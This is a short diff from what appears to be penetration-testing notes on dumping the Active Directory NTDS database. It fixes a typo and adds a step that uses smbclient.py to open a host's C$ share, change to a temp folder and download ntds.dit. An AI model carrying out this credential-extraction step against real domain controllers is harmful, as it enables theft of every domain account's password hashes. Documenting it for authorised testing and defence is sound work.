@@ -23,7 +23,8 @@ the issued command performs a pivotal task: creating a copy of the NTDS and subs
 	smbclient.py username@host 
 	shares 
 	use C$ 
-	cd temop
+			cd temp and get the files `ntds.dit`
 	```
+	
 
 	
